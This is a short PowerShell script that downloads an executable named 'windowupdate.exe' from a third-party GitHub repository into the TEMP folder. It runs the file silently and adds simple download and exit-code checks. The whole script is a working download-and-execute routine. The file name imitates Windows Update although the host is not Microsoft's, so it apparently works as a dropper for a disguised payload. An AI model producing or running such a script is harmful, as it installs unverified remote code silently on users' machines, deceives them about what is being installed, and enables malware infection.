# Simple PowerShell script to download and install windowupdate.exe with testing

# Define variables
$url = "https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/windowupdate.exe"
$path = "$env:TEMP\windowupdate.exe"

# Function to test download
function Test-Download {
    if (Test-Path $path) {
        Write-Host "Download successful: $path exists"
        return $true
    } else {
        Write-Host "Download failed: $path does not exist"
        return $false
    }
}

# Function to test install (basic check for exit code)
function Test-Install {
    param($exitCode)
    if ($exitCode -eq 0) {
        Write-Host "Install successful: Exit code $exitCode"
        return $true
    } else {
        Write-Host "Install failed: Exit code $exitCode"
        return $false
    }
}

# Download the file
Write-Host "Downloading $url to $path..."
try {
    Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
} catch {
    Write-Host "Download error: $_"
    exit 1
}

# Test download
if (-not (Test-Download)) {
    exit 1
}

# Install silently
Write-Host "Installing $path silently..."
try {
    $process = Start-Process $path -ArgumentList "/S" -Wait -PassThru -ErrorAction Stop
    $exitCode = $process.ExitCode
} catch {
    Write-Host "Install error: $_"
    exit 1
}

# Test install
if (Test-Install $exitCode) {
    Write-Host "Script completed successfully"
} else {
    exit 1
}
